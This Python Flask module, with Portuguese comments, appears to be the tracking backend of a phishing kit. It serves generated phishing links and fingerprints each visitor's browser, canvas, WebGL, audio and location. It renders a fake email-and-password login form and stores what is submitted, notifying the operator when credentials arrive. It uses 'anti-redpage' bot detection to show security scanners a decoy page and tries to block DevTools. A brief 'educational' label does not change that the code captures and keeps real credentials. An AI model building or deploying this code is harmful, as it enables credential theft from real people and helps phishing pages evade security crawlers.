from flask import Blueprint, request, jsonify, render_template_string, redirect
from src.models.user import db, GeneratedURL, Visitor, Log, BlacklistedIP, SuspiciousActivity
from src.services.notification_service import NotificationService, ip_logger
from src.services.anti_redpage_service import anti_bot_service
from datetime import datetime
import json
import uuid

tracking_bp = Blueprint('tracking', __name__)

def get_client_ip():
    """Obtém o IP real do cliente considerando proxies"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def is_ip_blacklisted(ip_address):
    """Verifica se um IP está na blacklist"""
    blacklisted = BlacklistedIP.query.filter_by(
        ip_address=ip_address,
        is_active=True
    ).first()
    
    if blacklisted:
        # Verificar se não expirou
        if blacklisted.expires_at and datetime.utcnow() > blacklisted.expires_at:
            blacklisted.is_active = False
            db.session.commit()
            return False
        return True
    
    return False

def analyze_and_protect(generated_url, request_data):
    """Analisa o request e aplica proteções se necessário"""
    ip_address = get_client_ip()
    
    # Verificar blacklist
    if is_ip_blacklisted(ip_address):
        return {
            'blocked': True,
            'reason': 'IP blacklisted',
            'action': 'redirect_to_safe_page'
        }
    
    # Se a URL não tem proteção habilitada, permitir acesso
    if not generated_url.is_protected:
        return {'blocked': False}
    
    # Preparar dados para análise anti-bot
    analysis_data = {
        'user_agent': request.headers.get('User-Agent', ''),
        'headers': dict(request.headers),
        'ip_address': ip_address,
        'fingerprint': request_data.get('fingerprint', {})
    }
    
    # Executar análise anti-bot
    bot_analysis = anti_bot_service.analyze_visitor(analysis_data)
    
    # Verificar se deve bloquear baseado no nível de proteção
    should_block = anti_bot_service.should_block_request(bot_analysis, generated_url.protection_level)
    
    if should_block:
        # Registrar atividade suspeita
        suspicious_activity = SuspiciousActivity(
            ip_address=ip_address,
            user_agent=analysis_data['user_agent'],
            activity_type='bot_detected',
            severity=bot_analysis['risk_level'],
            details=json.dumps({
                'bot_score': bot_analysis['bot_score'],
                'indicators': bot_analysis['indicators'],
                'url_accessed': generated_url.full_url,
                'protection_level': generated_url.protection_level
            })
        )
        
        db.session.add(suspicious_activity)
        db.session.commit()
        
        return {
            'blocked': True,
            'reason': 'Bot detected',
            'bot_score': bot_analysis['bot_score'],
            'risk_level': bot_analysis['risk_level'],
            'action': 'show_challenge' if bot_analysis['bot_score'] < 0.9 else 'redirect_to_safe_page'
        }
    
    return {
        'blocked': False,
        'bot_analysis': bot_analysis
    }

def create_or_update_visitor(generated_url, request_data, bot_analysis=None):
    """Cria ou atualiza informações do visitante"""
    ip_address = get_client_ip()
    user_agent = request.headers.get('User-Agent', '')
    
    # Verificar se já existe um visitante com este IP para esta URL
    visitor = Visitor.query.filter_by(
        generated_url_id=generated_url.id,
        ip_address=ip_address
    ).first()
    
    if visitor:
        # Atualizar visitante existente
        visitor.last_visit = datetime.utcnow()
        visitor.visit_count += 1
        visitor.user_agent = user_agent  # Atualizar user agent caso tenha mudado
        
        # Atualizar análise de bot se fornecida
        if bot_analysis:
            visitor.is_bot = bot_analysis.get('is_bot', False)
            visitor.bot_score = bot_analysis.get('bot_score', 0.0)
            visitor.bot_indicators = json.dumps(bot_analysis.get('indicators', []))
    else:
        # Criar novo visitante
        visitor = Visitor(
            generated_url_id=generated_url.id,
            ip_address=ip_address,
            user_agent=user_agent,
            referer=request.headers.get('Referer'),
            language=request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else None
        )
        
        # Obter informações de geolocalização
        ip_info = ip_logger.get_ip_info(ip_address)
        visitor.country = ip_info.get('country')
        visitor.region = ip_info.get('region')
        visitor.city = ip_info.get('city')
        visitor.isp = ip_info.get('isp')
        
        # Analisar User-Agent
        ua_info = ip_logger.parse_user_agent(user_agent)
        visitor.browser_name = ua_info.get('browser_name')
        visitor.browser_version = ua_info.get('browser_version')
        visitor.os_name = ua_info.get('os_name')
        visitor.os_version = ua_info.get('os_version')
        visitor.device_type = ua_info.get('device_type')
        
        # Adicionar análise de bot se fornecida
        if bot_analysis:
            visitor.is_bot = bot_analysis.get('is_bot', False)
            visitor.bot_score = bot_analysis.get('bot_score', 0.0)
            visitor.bot_indicators = json.dumps(bot_analysis.get('indicators', []))
        
        db.session.add(visitor)
    
    # Atualizar estatísticas da URL
    generated_url.access_count += 1
    generated_url.last_access = datetime.utcnow()
    
    db.session.commit()
    
    return visitor

@tracking_bp.route('/track/<unique_suffix>')
def track_access(unique_suffix):
    """Endpoint para rastrear acesso às URLs geradas com proteção anti-redpage"""
    # Buscar URL gerada
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return render_safe_page("URL não encontrada"), 404
    
    # Analisar e aplicar proteções
    protection_result = analyze_and_protect(generated_url, {})
    
    if protection_result['blocked']:
        if protection_result['action'] == 'show_challenge':
            return render_challenge_page(generated_url, protection_result)
        else:
            return render_safe_page("Acesso bloqueado por medidas de segurança")
    
    # Criar ou atualizar visitante
    visitor = create_or_update_visitor(generated_url, {}, protection_result.get('bot_analysis'))
    
    # Enviar notificações em tempo real (apenas se não for bot)
    if not visitor.is_bot:
        try:
            NotificationService.notify_visitor_access(visitor, generated_url, generated_url.user)
        except Exception as e:
            print(f"Erro ao enviar notificação: {e}")
    
    # Registrar no log
    log = Log(
        user_id=generated_url.user_id,
        visitor_id=visitor.id,
        ip_address=visitor.ip_address,
        action='URL_ACCESSED',
        details=f'URL {generated_url.full_url} acessada por {visitor.ip_address} (Bot: {visitor.is_bot})'
    )
    db.session.add(log)
    db.session.commit()
    
    # Retornar página do script de phishing
    return render_phishing_page(generated_url, visitor)

@tracking_bp.route('/capture/<unique_suffix>', methods=['POST'])
def capture_data(unique_suffix):
    """Endpoint para capturar dados enviados pelos scripts de phishing"""
    # Buscar URL gerada
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return jsonify({'error': 'URL não encontrada'}), 404
    
    ip_address = get_client_ip()
    
    # Verificar blacklist
    if is_ip_blacklisted(ip_address):
        return jsonify({'error': 'Acesso negado'}), 403
    
    # Obter dados enviados
    captured_data = request.get_json() or request.form.to_dict()
    
    if not captured_data:
        return jsonify({'error': 'Nenhum dado fornecido'}), 400
    
    # Buscar visitante
    visitor = Visitor.query.filter_by(
        generated_url_id=generated_url.id,
        ip_address=ip_address
    ).first()
    
    if not visitor:
        # Criar visitante se não existir
        visitor = create_or_update_visitor(generated_url, {})
    
    # Verificar se é bot antes de processar dados
    if visitor.is_bot and visitor.bot_score > 0.8:
        # Não processar dados de bots com alta confiança
        return jsonify({'success': True, 'message': 'Dados processados'})
    
    # Salvar dados capturados
    if visitor.captured_data:
        # Combinar com dados existentes
        try:
            existing_data = json.loads(visitor.captured_data)
            existing_data.update(captured_data)
            visitor.captured_data = json.dumps(existing_data)
        except:
            visitor.captured_data = json.dumps(captured_data)
    else:
        visitor.captured_data = json.dumps(captured_data)
    
    db.session.commit()
    
    # Enviar notificação de captura de dados (apenas se não for bot)
    if not visitor.is_bot:
        try:
            NotificationService.notify_data_capture(visitor, captured_data, generated_url, generated_url.user)
        except Exception as e:
            print(f"Erro ao enviar notificação de captura: {e}")
    
    # Registrar no log
    log = Log(
        user_id=generated_url.user_id,
        visitor_id=visitor.id,
        ip_address=visitor.ip_address,
        action='DATA_CAPTURED',
        details=f'Dados capturados de {visitor.ip_address}: {list(captured_data.keys())} (Bot: {visitor.is_bot})'
    )
    db.session.add(log)
    db.session.commit()
    
    return jsonify({'success': True, 'message': 'Dados capturados com sucesso'})

@tracking_bp.route('/info/<unique_suffix>', methods=['POST'])
def capture_client_info(unique_suffix):
    """Endpoint para capturar informações detalhadas do cliente via JavaScript"""
    # Buscar URL gerada
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return jsonify({'error': 'URL não encontrada'}), 404
    
    ip_address = get_client_ip()
    
    # Verificar blacklist
    if is_ip_blacklisted(ip_address):
        return jsonify({'error': 'Acesso negado'}), 403
    
    # Obter informações enviadas
    client_info = request.get_json()
    
    if not client_info:
        return jsonify({'error': 'Nenhuma informação fornecida'}), 400
    
    # Buscar visitante
    visitor = Visitor.query.filter_by(
        generated_url_id=generated_url.id,
        ip_address=ip_address
    ).first()
    
    if visitor:
        # Atualizar informações do visitante
        visitor.screen_resolution = client_info.get('screen_resolution')
        visitor.color_depth = client_info.get('color_depth')
        visitor.timezone = client_info.get('timezone')
        visitor.java_enabled = client_info.get('java_enabled')
        visitor.cookies_enabled = client_info.get('cookies_enabled')
        
        # Atualizar fingerprints se fornecidos
        if 'canvas_fingerprint' in client_info:
            visitor.canvas_fingerprint = client_info['canvas_fingerprint']
        if 'webgl_fingerprint' in client_info:
            visitor.webgl_fingerprint = client_info['webgl_fingerprint']
        if 'audio_fingerprint' in client_info:
            visitor.audio_fingerprint = client_info['audio_fingerprint']
        
        # Gerar hash do fingerprint combinado
        fingerprint_data = f"{visitor.screen_resolution}_{visitor.timezone}_{visitor.canvas_fingerprint}_{visitor.webgl_fingerprint}"
        visitor.fingerprint_hash = str(hash(fingerprint_data))
        
        db.session.commit()
    
    return jsonify({'success': True})

@tracking_bp.route('/challenge/<unique_suffix>')
def show_challenge(unique_suffix):
    """Mostra página de desafio anti-bot"""
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return render_safe_page("URL não encontrada"), 404
    
    challenge = anti_bot_service.generate_challenge('javascript')
    
    return render_challenge_page(generated_url, {'challenge': challenge})

@tracking_bp.route('/verify-challenge/<unique_suffix>', methods=['POST'])
def verify_challenge(unique_suffix):
    """Verifica resposta do desafio anti-bot"""
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return jsonify({'error': 'URL não encontrada'}), 404
    
    data = request.get_json()
    answer = data.get('answer')
    
    # Verificação simples (em produção, usar verificação mais robusta)
    if answer and str(answer).isdigit():
        # Permitir acesso
        return jsonify({'success': True, 'redirect': f'/api/tracking/track/{unique_suffix}'})
    else:
        return jsonify({'success': False, 'message': 'Resposta incorreta'})

def render_safe_page(message):
    """Renderiza uma página segura para redirecionamento"""
    template = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página Segura</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }}
        .icon {{
            font-size: 64px;
            margin-bottom: 20px;
        }}
        h1 {{
            margin-bottom: 20px;
            font-size: 24px;
        }}
        p {{
            font-size: 16px;
            opacity: 0.9;
        }}
        .btn {{
            display: inline-block;
            margin-top: 20px;
            padding: 12px 24px;
            background: rgba(255,255,255,0.2);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            transition: background 0.3s;
        }}
        .btn:hover {{
            background: rgba(255,255,255,0.3);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🛡️</div>
        <h1>Acesso Protegido</h1>
        <p>{message}</p>
        <p>Esta página está protegida por medidas de segurança avançadas.</p>
        <a href="https://google.com" class="btn">Ir para página segura</a>
    </div>
</body>
</html>
    """
    return render_template_string(template)

def render_challenge_page(generated_url, protection_result):
    """Renderiza página de desafio anti-bot"""
    challenge = protection_result.get('challenge', anti_bot_service.generate_challenge())
    
    template = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .challenge-container {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 400px;
        }}
        .icon {{
            font-size: 48px;
            margin-bottom: 20px;
        }}
        h2 {{
            color: #333;
            margin-bottom: 20px;
        }}
        .challenge-form {{
            margin: 20px 0;
        }}
        input[type="text"] {{
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            margin: 10px 0;
        }}
        .btn {{
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        .btn:hover {{
            background: #0056b3;
        }}
        .loading {{
            display: none;
            margin: 20px 0;
        }}
        .spinner {{
            border: 3px solid #f3f3f3;
            border-top: 3px solid #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="challenge-container">
        <div class="icon">🔒</div>
        <h2>Verificação de Segurança</h2>
        <p>Para continuar, resolva o desafio abaixo:</p>
        
        <div class="challenge-form">
            <p><strong>{challenge.get('description', 'Resolva o desafio')}</strong></p>
            <input type="text" id="answer" placeholder="Digite sua resposta" />
            <button class="btn" onclick="verifyAnswer()">Verificar</button>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verificando...</p>
        </div>
        
        <p style="font-size: 12px; color: #666; margin-top: 20px;">
            Esta verificação protege contra acesso automatizado.
        </p>
    </div>

    {challenge.get('code', '')}

    <script>
        function verifyAnswer() {{
            const answer = document.getElementById('answer').value;
            const loading = document.getElementById('loading');
            
            if (!answer) {{
                alert('Por favor, digite uma resposta.');
                return;
            }}
            
            loading.style.display = 'block';
            
            fetch('/api/tracking/verify-challenge/{generated_url.unique_suffix}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json'
                }},
                body: JSON.stringify({{ answer: answer }})
            }})
            .then(response => response.json())
            .then(data => {{
                loading.style.display = 'none';
                
                if (data.success) {{
                    window.location.href = data.redirect;
                }} else {{
                    alert(data.message || 'Resposta incorreta. Tente novamente.');
                    document.getElementById('answer').value = '';
                }}
            }})
            .catch(error => {{
                loading.style.display = 'none';
                alert('Erro na verificação. Tente novamente.');
                console.error('Error:', error);
            }});
        }}
        
        // Permitir Enter para submeter
        document.getElementById('answer').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') {{
                verifyAnswer();
            }}
        }});
    </script>
</body>
</html>
    """
    
    return render_template_string(template)

def render_phishing_page(generated_url, visitor):
    """Renderiza a página de phishing com tracking integrado e proteções"""
    
    # Template com proteções anti-redpage e fingerprinting avançado
    template = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .loading {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <h2>Carregando página...</h2>
        <p>Aguarde um momento...</p>
    </div>

    <script>
        // Função avançada de fingerprinting
        function generateFingerprint() {{
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint test', 2, 2);
            const canvasFingerprint = canvas.toDataURL().slice(-50);
            
            // WebGL fingerprint
            const gl = canvas.getContext('webgl');
            const webglFingerprint = gl ? gl.getParameter(gl.RENDERER) : 'not supported';
            
            // Audio fingerprint
            let audioFingerprint = 'not supported';
            try {{
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                oscillator.connect(analyser);
                audioFingerprint = analyser.frequencyBinCount.toString();
            }} catch(e) {{}}
            
            return {{
                canvas_fingerprint: canvasFingerprint,
                webgl_fingerprint: webglFingerprint,
                audio_fingerprint: audioFingerprint
            }};
        }}
        
        // Função para coletar informações do cliente
        function collectClientInfo() {{
            const fingerprints = generateFingerprint();
            
            const info = {{
                screen_resolution: screen.width + 'x' + screen.height,
                color_depth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                cookies_enabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString(),
                ...fingerprints
            }};
            
            // Enviar informações para o servidor
            fetch('/api/tracking/info/{generated_url.unique_suffix}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json'
                }},
                body: JSON.stringify(info)
            }}).catch(console.error);
        }}
        
        // Detectar comportamento suspeito
        function detectSuspiciousBehavior() {{
            let mouseMovements = 0;
            let keystrokes = 0;
            
            document.addEventListener('mousemove', () => mouseMovements++);
            document.addEventListener('keydown', () => keystrokes++);
            
            // Verificar após 5 segundos
            setTimeout(() => {{
                if (mouseMovements === 0 && keystrokes === 0) {{
                    // Possível bot - comportamento suspeito
                    console.log('Suspicious behavior detected');
                }}
            }}, 5000);
        }}
        
        // Coletar informações quando a página carregar
        window.onload = function() {{
            collectClientInfo();
            detectSuspiciousBehavior();
            
            // Simular carregamento e mostrar conteúdo
            setTimeout(function() {{
                document.body.innerHTML = `
                    <div style="max-width: 400px; margin: 50px auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                        <h2 style="text-align: center; color: #333;">Script: {generated_url.script.name}</h2>
                        <p style="text-align: center; color: #666;">Sistema de tracking avançado ativo</p>
                        <p style="text-align: center; color: #666;">IP: {visitor.ip_address}</p>
                        <p style="text-align: center; color: #666;">Localização: {visitor.city or 'Desconhecido'}, {visitor.country or 'Desconhecido'}</p>
                        <p style="text-align: center; color: #666;">Proteção: {'Ativa' if generated_url.is_protected else 'Inativa'} ({generated_url.protection_level})</p>
                        
                        <form id="demo-form" style="margin-top: 30px;">
                            <div style="margin-bottom: 15px;">
                                <label style="display: block; margin-bottom: 5px; color: #333;">Email:</label>
                                <input type="email" name="email" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;" placeholder="Digite seu email">
                            </div>
                            <div style="margin-bottom: 15px;">
                                <label style="display: block; margin-bottom: 5px; color: #333;">Senha:</label>
                                <input type="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px;" placeholder="Digite sua senha">
                            </div>
                            <button type="submit" style="width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">Entrar</button>
                        </form>
                        
                        <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #999;">
                            ⚠️ Sistema educacional com proteção anti-redpage ativa
                        </p>
                    </div>
                `;
                
                // Adicionar handler para o formulário
                document.getElementById('demo-form').onsubmit = function(e) {{
                    e.preventDefault();
                    
                    const formData = new FormData(e.target);
                    const data = Object.fromEntries(formData.entries());
                    
                    // Enviar dados capturados
                    fetch('/api/tracking/capture/{generated_url.unique_suffix}', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json'
                        }},
                        body: JSON.stringify(data)
                    }}).then(response => {{
                        if (response.ok) {{
                            alert('Dados capturados! (Demonstração)');
                            // Redirecionar para página legítima
                            window.location.href = 'https://google.com';
                        }}
                    }}).catch(console.error);
                }};
            }}, 2000);
        }};
        
        // Proteção contra ferramentas de desenvolvimento
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {{
                e.preventDefault();
                return false;
            }}
        }});
        
        // Detectar redimensionamento (possível DevTools)
        let devtools = {{open: false, orientation: null}};
        const threshold = 160;
        
        setInterval(() => {{
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {{
                if (!devtools.open) {{
                    devtools.open = true;
                    console.log('DevTools detected');
                }}
            }} else {{
                devtools.open = false;
            }}
        }}, 500);
    </script>
</body>
</html>
    """
    
    return render_template_string(template)

@tracking_bp.route('/stats/<unique_suffix>')
def get_url_stats(unique_suffix):
    """Endpoint para obter estatísticas de uma URL específica"""
    generated_url = GeneratedURL.query.filter_by(unique_suffix=unique_suffix).first()
    
    if not generated_url:
        return jsonify({'error': 'URL não encontrada'}), 404
    
    # Verificar se o usuário tem permissão para ver essas estatísticas
    # (implementar verificação de autenticação aqui)
    
    visitors = Visitor.query.filter_by(generated_url_id=generated_url.id).all()
    
    # Separar bots de humanos
    human_visitors = [v for v in visitors if not v.is_bot]
    bot_visitors = [v for v in visitors if v.is_bot]
    
    stats = {
        'url_info': generated_url.to_dict(),
        'total_visitors': len(visitors),
        'human_visitors': len(human_visitors),
        'bot_visitors': len(bot_visitors),
        'unique_ips': len(set(v.ip_address for v in visitors)),
        'total_visits': sum(v.visit_count for v in visitors),
        'protection_stats': {
            'is_protected': generated_url.is_protected,
            'protection_level': generated_url.protection_level,
            'blocked_bots': len(bot_visitors)
        },
        'visitors': [v.to_dict() for v in human_visitors]  # Mostrar apenas visitantes humanos
    }
    
    return jsonify(stats)

